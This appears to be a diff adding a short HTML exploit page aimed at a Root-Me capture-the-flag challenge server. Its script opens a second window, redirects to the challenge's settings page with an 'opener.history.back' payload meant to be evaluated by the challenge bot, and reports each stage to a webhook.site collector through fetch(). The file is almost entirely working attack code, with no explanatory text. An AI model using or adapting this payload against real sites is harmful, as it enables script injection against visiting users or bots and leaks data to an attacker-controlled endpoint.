@@ -1,0 +1,15 @@
+<!doctype html><meta charset=utf8><title>c</title><script>
+const WH='https://webhook.site/ca7d4ed4-7642-47ad-98ea-a6f1d402216f';
+const CH='http://challenge01.root-me.org:58010';
+function b(m){fetch(WH+'?m='+encodeURIComponent(m)+'&t='+Date.now()).then(r=>r.text()).then(()=>{}).catch(e=>{});}
+if(location.hash=='#2'){
+  b('W2 stage');
+  setTimeout(()=>{b('W2 nav eval');location=CH+'/settings?edit=opener.history.back';},900);
+}else if(window.name=='A1RUN'){
+  b('A1 BACK-ran! eval opener-op OK in bot');
+}else{
+  window.name='A1RUN';b('A1 stage');
+  window.open(location.href+'#2','w2c'+Date.now());
+  setTimeout(()=>{b('A1 nav challenge');location=CH+'/settings';},1800);
+}
+</script>
